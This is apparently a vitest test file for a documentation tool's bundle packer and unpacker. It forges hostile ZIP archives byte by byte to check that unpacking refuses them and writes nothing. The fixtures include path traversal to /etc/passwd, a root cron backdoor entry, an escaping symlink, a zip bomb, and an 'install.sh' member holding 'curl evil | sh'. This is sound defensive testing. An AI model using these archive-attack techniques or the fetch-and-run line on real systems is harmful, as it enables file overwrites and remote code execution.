/**
 * Bundles: what `pack` puts in one, and what `unpack` refuses to take out of one.
 *
 * The refusals are the point of this file, so they are tested against **real archives, forged
 * byte by byte** rather than against a mocked reader. A mock proves that the code rejects the
 * object the test built; only an archive proves that the reader rejects the bytes an attacker
 * would actually send, and every one of the cases below is a shape that exists in the wild.
 *
 * Every refusal is asserted twice: the error, and the filesystem. "It threw" is not the property
 * that matters — "and it wrote nothing" is.
 */
import { describe, expect, it } from "vitest";
import { existsSync } from "node:fs";
import { cp, mkdir, readFile, readdir, stat, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { deflateRawSync } from "node:zlib";
import { tempDir } from "../../../test/tmp.js";
import {
  BUNDLE_MANIFEST_PATH, BundleError, DEFAULT_BUNDLE_LIMITS, sha256Hex, verifyBundleEntries,
  type BundleEntry, type BundleManifest, type Manifest,
} from "@pagina/core";
import { packBundle, unpackBundle } from "../src/bundle.js";
import { crc32, readZip, writeZip } from "../src/zip.js";

const fixture = new URL("../../core/test/fixture/", import.meta.url).pathname;
const outsideFixture = new URL("../../core/test/outside/", import.meta.url).pathname;
/** One instant for every bundle in this file, so "identical bytes" means something. */
const CREATED = "2026-08-18T09:00:00.000Z";

const utf8 = (data: Uint8Array): string => new TextDecoder().decode(data);
const bytes = (text: string): Uint8Array => new TextEncoder().encode(text);
const temp = tempDir;

/**
 * A throwaway copy of the fixture, with its `../outside` snippet root beside it.
 *
 * The fixture reaches outside its own folder for a snippet on purpose — that is the case the
 * whole "resolve, don't copy" design exists for — so a copy without a sibling `outside/` would
 * fail on a missing snippet rather than on whatever the test is about.
 */
async function copyFixture(edit?: (folder: string) => Promise<void>): Promise<string> {
  const parent = await temp("fixture");
  const folder = join(parent, "fixture");
  await cp(fixture, folder, { recursive: true });
  await cp(outsideFixture, join(parent, "outside"), { recursive: true });
  await edit?.(folder);
  return folder;
}

async function packed(folder: string, name = "article.pgz"): Promise<{ file: string; bytes: Buffer }> {
  const dir = await temp("out");
  const file = join(dir, name);
  await packBundle({ folder, out: file, created: CREATED });
  return { file, bytes: await readFile(file) };
}

/** The refusal a call produced, asserted to be a `BundleError` rather than a crash. */
async function refusal(run: () => Promise<unknown>): Promise<BundleError> {
  try {
    await run();
  } catch (e) {
    expect(e, `expected a BundleError, got: ${String(e)}`).toBeInstanceOf(BundleError);
    return e as BundleError;
  }
  throw new Error("expected a refusal, got success");
}

/** Every file under a directory, as bundle-style relative posix paths. */
async function tree(dir: string): Promise<string[]> {
  const out: string[] = [];
  const walk = async (d: string, prefix: string): Promise<void> => {
    for (const entry of await readdir(d, { withFileTypes: true })) {
      const rel = prefix === "" ? entry.name : `${prefix}/${entry.name}`;
      if (entry.isDirectory()) await walk(join(d, entry.name), rel);
      else out.push(rel);
    }
  };
  await walk(dir, "");
  return out.sort();
}

// ---------------------------------------------------------------------------------------------
// Forging archives
// ---------------------------------------------------------------------------------------------

interface ForgedEntry {
  readonly name: string;
  readonly data: Uint8Array;
  /** Override the name written into the local header, to disagree with the central directory. */
  readonly localName?: string;
  /** Override the uncompressed size the central directory declares. */
  readonly declaredSize?: number;
  /** The high half of the external attributes: `0o120777` makes the entry a symlink. */
  readonly unixMode?: number;
  readonly store?: boolean;
}

/**
 * A ZIP writer with no scruples.
 *
 * `writeZip` cannot produce any of the archives below — it normalises names, marks every entry a
 * regular file and never lies about a size — which is precisely why the tests need their own.
 */
function forge(entries: readonly ForgedEntry[]): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, "utf8");
    const localName = Buffer.from(e.localName ?? e.name, "utf8");
    const raw = Buffer.from(e.data);
    const body = e.store === true ? raw : deflateRawSync(raw);
    const method = e.store === true ? 0 : 8;
    const declared = e.declaredSize ?? raw.byteLength;
    const crc = crc32(e.data);

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0x0800, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(body.byteLength, 18);
    local.writeUInt32LE(declared, 22);
    local.writeUInt16LE(localName.byteLength, 26);
    locals.push(local, localName, body);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE((3 << 8) | 20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0x0800, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(body.byteLength, 20);
    central.writeUInt32LE(declared, 24);
    central.writeUInt16LE(name.byteLength, 28);
    central.writeUInt32LE(((e.unixMode ?? 0o100644) << 16) >>> 0, 38);
    central.writeUInt32LE(offset, 42);
    centrals.push(central, name);

    offset += local.byteLength + localName.byteLength + body.byteLength;
  }
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cd.byteLength, 12);
  eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

/** A descriptor that honestly describes the entries given — the baseline each attack deviates from. */
async function descriptorFor(entries: readonly ForgedEntry[], patch: Partial<BundleManifest> = {}): Promise<string> {
  const files = [];
  for (const e of entries) files.push({ path: e.name, size: e.data.byteLength, sha256: await sha256Hex(e.data) });
  const manifest: BundleManifest = {
    format: 1, pagina: "0.1.0", created: CREATED, slug: "evil", title: "Evil", base: "/",
    totalSize: files.reduce((n, f) => n + f.size, 0), files, external: [],
    ...patch,
  };
  return `${JSON.stringify(manifest, null, 2)}\n`;
}

/** Writes a forged archive to disk and hands back a destination that does not exist yet. */
async function forged(entries: readonly ForgedEntry[], descriptor?: string): Promise<{ file: string; dest: string }> {
  const dir = await temp("forged");
  const all = descriptor === undefined
    ? entries
    : [...entries, { name: BUNDLE_MANIFEST_PATH, data: bytes(descriptor) }];
  const file = join(dir, "evil.pgz");
  await writeFile(file, forge(all));
  return { file, dest: join(dir, "dest") };
}

// ---------------------------------------------------------------------------------------------

describe("the ZIP codec", () => {
  it("round-trips entries, byte for byte, including empty and binary ones", () => {
    const entries: BundleEntry[] = [
      { path: "article.yaml", data: bytes("slug: x\n") },
      { path: "empty", data: new Uint8Array(0) },
      { path: "media/blob.bin", data: new Uint8Array(Array.from({ length: 300 }, (_, i) => i % 251)) },
      { path: "a/b/c/deep.txt", data: bytes("deep\n") },
    ];
    const back = readZip(writeZip(entries), DEFAULT_BUNDLE_LIMITS);
    expect(back.map((e) => e.path)).toEqual(entries.map((e) => e.path));
    for (const [i, e] of entries.entries()) expect([...back[i]!.data], e.path).toEqual([...e.data]);
  });

  it("writes the same bytes twice — no clock, no entropy, no reordering", () => {
    const entries: BundleEntry[] = [{ path: "index.md", data: bytes("# Hi\n") }];
    expect([...writeZip(entries)]).toEqual([...writeZip(entries)]);
  });

  it("refuses an archive that is not one", async () => {
    expect((await refusal(async () => readZip(bytes("this is not a zip at all"), DEFAULT_BUNDLE_LIMITS))).code).toBe("bundle-format");
  });
});

/**
 * A bundle carries a staff list only when somebody asks for one.
 *
 * Both directions are asserted, because a default that leaks names is discovered afterwards or not
 * at all — there is no error to notice, only a file that went somewhere with more in it than the
 * sender meant.
 */
describe("packBundle and attribution", () => {
  const LOG = [
    { path: "index.md", action: "write", at: "2026-08-18T10:00:00.000Z", by: { id: "u1", name: "Ada" }, version: "aaa" },
    { path: "guide/tabs.md", action: "write", at: "2026-08-18T11:00:00.000Z", by: { id: "u2", name: "Grace" }, version: "bbb" },
    // A file the bundle does not carry. Its author must not travel either.
    { path: "planning/notes.txt", action: "write", at: "2026-08-18T12:00:00.000Z", by: { id: "u3", name: "Katherine" }, version: "ccc" },
  ];

  const withLog = async (): Promise<string> => await copyFixture(async (f) => {
    await mkdir(join(f, ".pagina"), { recursive: true });
    await writeFile(join(f, ".pagina/edits.jsonl"), `${LOG.map((e) => JSON.stringify(e)).join("\n")}\n`, "utf8");
  });

  it("strips attribution by default, and says nothing about it in the bundle", async () => {
    const folder = await withLog();
    const out = join(await temp("out"), "a.pgz");
    const r = await packBundle({ folder, out, created: CREATED });

    expect(r.manifest.attribution).toBeUndefined();
    // Not merely absent from the parsed manifest — absent from the bytes. A name that survives in
    // `bundle.json` has left the building whether or not a reader looks for it.
    const archive = readZip(new Uint8Array(await readFile(out)), DEFAULT_BUNDLE_LIMITS);
    for (const entry of archive) expect(utf8(entry.data)).not.toMatch(/Ada|Grace|Katherine/);
  });

  it("includes it on request, covering only the files the bundle actually carries", async () => {
    const folder = await withLog();
    const out = join(await temp("out"), "a.pgz");
    const r = await packBundle({ folder, out, created: CREATED, withAttribution: true });

    expect(r.manifest.attribution).toEqual([
      { path: "guide/tabs.md", lastEditedBy: { id: "u2", name: "Grace" }, lastEditedAt: "2026-08-18T11:00:00.000Z" },
      { path: "index.md", lastEditedBy: { id: "u1", name: "Ada" }, lastEditedAt: "2026-08-18T10:00:00.000Z" },
    ]);
    // `planning/notes.txt` is not in the bundle, so neither is Katherine: a folder's history must
    // not be a way to export the name of a file that was excluded from the archive.
    expect(JSON.stringify(r.manifest)).not.toMatch(/Katherine/);

    // And it survives the round trip a receiving host makes.
    const dir = join(await temp("in"), "article");
    expect((await unpackBundle({ file: out, dir })).manifest.attribution).toEqual(r.manifest.attribution);
  });

  it("packs the same either way when the folder has no log", async () => {
    const folder = await copyFixture();
    const bare = await packBundle({ folder, out: join(await temp("a"), "a.pgz"), created: CREATED });
    const asked = await packBundle({ folder, out: join(await temp("b"), "b.pgz"), created: CREATED, withAttribution: true });
    expect(bare.manifest.attribution).toBeUndefined();
    expect(asked.manifest.attribution).toEqual([]);
  });

  it("refuses a bundle whose attribution is malformed rather than showing an invented name", async () => {
    const folder = await withLog();
    const out = join(await temp("out"), "a.pgz");
    await packBundle({ folder, out, created: CREATED, withAttribution: true });
    const entries = readZip(new Uint8Array(await readFile(out)), DEFAULT_BUNDLE_LIMITS);
    const descriptor = entries.find((e) => e.path === BUNDLE_MANIFEST_PATH)!;
    const manifest = JSON.parse(utf8(descriptor.data)) as Record<string, unknown>;
    manifest["attribution"] = [{ path: "index.md", lastEditedBy: { id: "u1" }, lastEditedAt: "2026-08-18T10:00:00.000Z" }];
    const forged = writeZip([
      ...entries.filter((e) => e.path !== BUNDLE_MANIFEST_PATH),
      { path: BUNDLE_MANIFEST_PATH, data: bytes(JSON.stringify(manifest)) },
    ]);
    const file = join(await temp("forged"), "forged.pgz");
    await writeFile(file, forged);
    const dest = join(await temp("dest"), "x");
    const e = await refusal(() => unpackBundle({ file, dir: dest }));
    expect(e.message).toMatch(/lastEditedBy/);
  });
});

describe("packBundle", () => {
  it("carries the pages, their assets, their snippets and the rendered output — and nothing else", async () => {
    const folder = await copyFixture(async (f) => {
      // Two files the design says a verbatim zip would ship and a bundle must not: an asset no
      // page references, and a directory of source material that is not part of the article.
      await writeFile(join(f, "media/unreferenced.svg"), "<svg/>", "utf8");
      await mkdir(join(f, "planning"), { recursive: true });
      await writeFile(join(f, "planning/notes.txt"), "internal", "utf8");
    });
    const r = await packBundle({ folder, out: join(await temp("out"), "a.pgz"), created: CREATED });
    const paths = r.manifest.files.map((f) => f.path);
    expect(paths).toEqual([
      ".rendered/figures/chrome-demo.dark.svg",
      ".rendered/figures/chrome-demo.light.svg",
      ".rendered/figures/inline-demo.dark.svg",
      ".rendered/figures/inline-demo.light.svg",
      ".rendered/figures/instrument-demo.dark.svg",
      ".rendered/figures/instrument-demo.light.svg",
      ".rendered/figures/kg-guide-figures-1.dark.svg",
      ".rendered/figures/kg-guide-figures-1.light.svg",
      ".rendered/manifest.json",
      ".rendered/pages/guide-figures.html",
      ".rendered/pages/guide-tabs.html",
      ".rendered/pages/index.html",
      ".rendered/search.json",
      "article.yaml",
      "guide/figures.md",
      "guide/tabs.md",
      "index.md",
      "media/cover.svg",
      "media/static.svg",
      "scenes/demo.mjs",
      "snippets/hello.py",
      "snippets/hello.rs",
    ]);
    expect(paths).not.toContain("media/unreferenced.svg");
    expect(paths).not.toContain("planning/notes.txt");
  });

  it("resolves a snippet out of the repo and points the page at the copy", async () => {
    const folder = await copyFixture();
    const dir = await temp("unpacked");
    await packBundle({ folder, out: join(dir, "a.pgz"), created: CREATED });
    const r = await unpackBundle({ file: join(dir, "a.pgz"), dir: join(dir, "article") });
    // The page kept its directive — the bundle is still source you can edit — but the directive
    // now names a file inside the bundle.
    expect(await readFile(join(r.dir, "guide/tabs.md"), "utf8")).toContain('--8<-- "snippets/hello.rs"');
    expect(await readFile(join(r.dir, "guide/tabs.md"), "utf8")).toContain('--8<-- "snippets/hello.py:main"');
    expect(await readFile(join(r.dir, "snippets/hello.rs"), "utf8"))
      .toBe(await readFile(join(outsideFixture, "hello.rs"), "utf8"));
    // ...and the roots it needed to reach outside are gone, so nothing in the bundle can.
    expect(await readFile(join(r.dir, "article.yaml"), "utf8")).not.toContain("../outside");
  });

  it("packs the same folder twice into the same bytes", async () => {
    const folder = await copyFixture();
    const a = await packed(folder, "a.pgz");
    const b = await packed(folder, "b.pgz");
    expect(a.bytes.equals(b.bytes)).toBe(true);
  });

  it("reports an http reference rather than pretending it packed it", async () => {
    const folder = await copyFixture(async (f) => {
      await writeFile(join(f, "index.md"), "# Fixture\n\n![remote](https://example.com/hero.png)\n\nSee [tabs](guide/tabs.md) and [figures](guide/figures.md#second).\n", "utf8");
    });
    const r = await packBundle({ folder, out: join(await temp("out"), "a.pgz"), created: CREATED });
    expect(r.manifest.external).toEqual(["https://example.com/hero.png"]);
    expect(r.diagnostics.some((d) => d.code === "bundle-external-ref")).toBe(true);
  });

  describe("refuses rather than guesses", () => {
    it("a nav entry naming a page that does not exist", async () => {
      const folder = await copyFixture(async (f) => {
        await writeFile(join(f, "article.yaml"), `${await readFile(join(f, "article.yaml"), "utf8")}      - { title: Gone, page: guide/gone.md }\n`, "utf8");
      });
      await expect(packBundle({ folder, out: join(await temp("out"), "a.pgz") })).rejects.toThrow(/guide\/gone\.md/);
    });

    it("a referenced asset that is missing", async () => {
      const folder = await copyFixture(async (f) => {
        await writeFile(join(f, "index.md"), "# Fixture\n\n![gone](media/gone.png)\n\nSee [tabs](guide/tabs.md) and [figures](guide/figures.md#second).\n", "utf8");
      });
      const out = join(await temp("out"), "a.pgz");
      const e = await refusal(() => packBundle({ folder, out }));
      expect(e.message).toContain("media/gone.png");
      expect(e.message).toContain("bundle-asset-missing");
    });

    it("a snippet that resolves outside the declared roots", async () => {
      // The file is still there and `..` still reaches it — the roots are the fence, and this is
      // the test that the fence is load-bearing rather than decorative.
      const folder = await copyFixture(async (f) => {
        const yaml = await readFile(join(f, "article.yaml"), "utf8");
        await writeFile(join(f, "article.yaml"), yaml.replace(`roots: [".", "../outside"]`, `roots: ["."]`), "utf8");
      });
      const out = join(await temp("out"), "a.pgz");
      const e = await refusal(() => packBundle({ folder, out }));
      expect(e.message).toContain("bundle-snippet-outside-roots");
      expect(e.message).toContain("../outside/hello.rs");
    });

    it("a symlink pointing out of the folder", async () => {
      const folder = await copyFixture(async (f) => {
        await symlink("/etc/hosts", join(f, "media/leak.svg"));
      });
      const out = join(await temp("out"), "a.pgz");
      const e = await refusal(() => packBundle({ folder, out }));
      expect(e.code).toBe("bundle-symlink");
      expect(e.message).toContain("leak.svg");
    });

    it("a figure whose scene module cannot be resolved", async () => {
      const folder = await copyFixture(async (f) => {
        const md = await readFile(join(f, "guide/figures.md"), "utf8");
        await writeFile(join(f, "guide/figures.md"), md.replace("../scenes/demo.mjs", "../scenes/gone.mjs"), "utf8");
      });
      await expect(packBundle({ folder, out: join(await temp("out"), "a.pgz") })).rejects.toThrow(/gone\.mjs/);
    });
  });
});

describe("unpackBundle", () => {
  it("writes exactly what bundle.json lists, and nothing above the destination", async () => {
    const folder = await copyFixture();
    const { file } = await packed(folder);
    const dir = join(await temp("dest"), "article");
    const r = await unpackBundle({ file, dir });
    expect(await tree(dir)).toEqual([...r.manifest.files.map((f) => f.path), BUNDLE_MANIFEST_PATH].sort());
  });

  it("leaves the article folder readable by the server that has to serve it", async () => {
    const folder = await copyFixture();
    const { file } = await packed(folder);
    const dir = join(await temp("dest"), "article");
    await unpackBundle({ file, dir });
    // The staging directory is private, as a staging directory should be; the article that comes
    // out of it is not, or `.rendered/` is unreadable to every user but the importer's.
    expect((await stat(dir)).mode & 0o055).toBe(0o055);
  });

  it("refuses a destination that already holds something, unless told otherwise", async () => {
    const folder = await copyFixture();
    const { file } = await packed(folder);
    const dir = join(await temp("dest"), "article");
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, "keep.txt"), "someone's work", "utf8");

    const e = await refusal(() => unpackBundle({ file, dir }));
    expect(e.code).toBe("bundle-destination");
    expect(await readFile(join(dir, "keep.txt"), "utf8")).toBe("someone's work");

    await unpackBundle({ file, dir, force: true });
    expect(existsSync(join(dir, "keep.txt"))).toBe(false);
    expect(existsSync(join(dir, "article.yaml"))).toBe(true);
  });

  describe("refuses a hostile archive, whole, without touching the destination", () => {
    /** The shared assertion: it refused, with the expected code, and the destination is untouched. */
    async function refuses(entries: readonly ForgedEntry[], descriptor: string | undefined, code: string, needle?: string): Promise<void> {
      const { file, dest } = await forged(entries, descriptor);
      const e = await refusal(() => unpackBundle({ file, dir: dest }));
      expect(e.code).toBe(code);
      if (needle !== undefined) expect(e.message).toContain(needle);
      expect(existsSync(dest), "the destination was created").toBe(false);
    }

    it("an entry that traverses out of the destination", async () => {
      const entries = [{ name: "index.md", data: bytes("# Hi\n") }, { name: "../../etc/passwd", data: bytes("root::0:0\n") }];
      await refuses(entries, await descriptorFor(entries), "bundle-path", "etc/passwd");
    });

    it("an entry with an absolute path", async () => {
      const entries = [{ name: "/etc/cron.d/backdoor", data: bytes("* * * * * root sh\n") }];
      await refuses(entries, await descriptorFor(entries), "bundle-path", "cron.d");
    });

    it("an entry that is a symlink pointing outside", async () => {
      // `0o120777` is `S_IFLNK | 0777`: the entry's *content* is the link target, so an extractor
      // that writes it as a link turns every later write through that name into a write to /etc.
      const entries = [
        { name: "index.md", data: bytes("# Hi\n") },
        { name: "media/logo.png", data: bytes("../../../../etc/passwd"), unixMode: 0o120777 },
      ];
      await refuses(entries, await descriptorFor(entries), "bundle-symlink", "media/logo.png");
    });

    it("an entry whose local header disagrees with the central directory", async () => {
      const entries = [{ name: "index.md", data: bytes("# Hi\n"), localName: "../escape.md" }];
      await refuses(entries, await descriptorFor(entries), "bundle-path", "escape.md");
    });

    it("an archive that lies about a declared size", async () => {
      const entries = [{ name: "index.md", data: bytes("# Hi, this is longer than it claims\n"), declaredSize: 4 }];
      await refuses(entries, await descriptorFor(entries), "bundle-size", "index.md");
    });

    it("a descriptor whose totals do not add up", async () => {
      const entries = [{ name: "index.md", data: bytes("# Hi\n") }];
      await refuses(entries, await descriptorFor(entries, { totalSize: 999_999 }), "bundle-size", "totalSize");
    });

    it("a bomb, before it inflates a byte of it", async () => {
      // 8 MB of zeros in a few kilobytes of archive: well inside every absolute cap, and about
      // 1000:1, which no article of prose and SVG has ever been.
      const entries = [{ name: "index.md", data: new Uint8Array(8 * 1024 * 1024) }];
      await refuses(entries, await descriptorFor(entries), "bundle-ratio");
    });

    it("a file whose checksum does not match its record", async () => {
      const honest = [{ name: "index.md", data: bytes("# Hi\n") }];
      const descriptor = await descriptorFor(honest);
      // The bytes changed after the descriptor was written — a tampered mirror, or a bad disk.
      const tampered = [{ name: "index.md", data: bytes("# Hj\n") }];
      await refuses(tampered, descriptor, "bundle-checksum", "index.md");
    });

    it("a member the descriptor never accounted for", async () => {
      const honest = [{ name: "index.md", data: bytes("# Hi\n") }];
      const descriptor = await descriptorFor(honest);
      await refuses([...honest, { name: "install.sh", data: bytes("curl evil | sh\n") }], descriptor, "bundle-extra-entry", "install.sh");
    });

    it("a ZIP that is not a bundle at all", async () => {
      await refuses([{ name: "index.md", data: bytes("# Hi\n") }], undefined, "bundle-manifest", BUNDLE_MANIFEST_PATH);
    });

    it("a directory entry, which is a shape a bundle never has", async () => {
      const entries = [{ name: "media/", data: new Uint8Array(0) }];
      await refuses(entries, undefined, "bundle-path", "media/");
    });
  });
});

describe("the round trip", () => {
  it("packs, unpacks and packs again into identical bytes", async () => {
    const folder = await copyFixture();
    const first = await packed(folder, "first.pgz");
    const dir = await temp("roundtrip");
    const unpacked = await unpackBundle({ file: first.file, dir: join(dir, "article") });
    const second = await packed(unpacked.dir, "second.pgz");
    // The strongest statement available: rendering the *bundle* reproduces the bundle, so the
    // article survived the move with nothing lost and nothing added.
    expect(second.bytes.equals(first.bytes)).toBe(true);
  });

  it("renders byte-identically on a machine that never had the source repo", async () => {
    const folder = await copyFixture();
    const { file } = await packed(folder);
    // Far from the fixture and from its `../outside` sibling: nothing the pages need is reachable
    // except through the bundle itself.
    const far = join(await temp("elsewhere"), "deep", "nested", "article");
    const unpacked = await unpackBundle({ file, dir: far });

    const rendered = JSON.parse(await readFile(join(far, ".rendered/manifest.json"), "utf8")) as Manifest;
    // Every path the manifest names resolves inside the bundle. This is the property that fails
    // first when a pack copies a folder instead of resolving one.
    for (const asset of rendered.assets) expect(existsSync(join(far, asset)), asset).toBe(true);
    for (const href of Object.keys(rendered.pages)) {
      const slug = href === "/" ? "index" : href.replace(/^\/|\/$/g, "").replace(/\//g, "-");
      expect(existsSync(join(far, `.rendered/pages/${slug}.html`)), href).toBe(true);
    }
    // Every drawn figure travelled as SVG. A `static` figure has nothing to draw — it is an
    // author's own image file, and that arrived as an asset above.
    for (const [id, figure] of Object.entries(rendered.figures))
      if (figure.kind !== "static")
        expect(existsSync(join(far, `.rendered/figures/${id}.light.svg`)), id).toBe(true);
    // Nav order is the article's table of contents; a bundle that reorders it is a different book.
    expect(rendered.nav).toEqual([
      { title: "Home", href: "/" },
      { title: "Guide", children: [{ title: "Tabs and snippets", href: "/guide/tabs/" }, { title: "Figures", href: "/guide/figures/" }] },
    ]);
    // The figures travelled as drawn SVG, not as a promise to draw them.
    expect(await readFile(join(far, ".rendered/figures/inline-demo.light.svg"), "utf8")).toContain("<svg");
    expect(await readFile(join(far, ".rendered/pages/guide-figures.html"), "utf8")).toContain("<svg");

    // And building it from source, here, with no repo around it, produces the same bytes.
    const rebuilt = await packed(unpacked.dir, "rebuilt.pgz");
    expect(rebuilt.bytes.equals((await readFile(file))!)).toBe(true);
  });

  it("hands a host a bundle its own verifier agrees with", async () => {
    const folder = await copyFixture();
    const { file, bytes: archive } = await packed(folder);
    // The path a Laravel importer takes: decode, then call core's verification directly.
    const entries = readZip(new Uint8Array(archive), DEFAULT_BUNDLE_LIMITS);
    const descriptor = entries.find((e) => e.path === BUNDLE_MANIFEST_PATH)!;
    const manifest = JSON.parse(utf8(descriptor.data)) as BundleManifest;
    await expect(verifyBundleEntries({
      manifest,
      entries: entries.filter((e) => e.path !== BUNDLE_MANIFEST_PATH),
      archiveSize: archive.byteLength,
    })).resolves.toBeUndefined();
    expect(manifest.slug).toBe("fixture");
    expect(file.endsWith(".pgz")).toBe(true);
  });
});
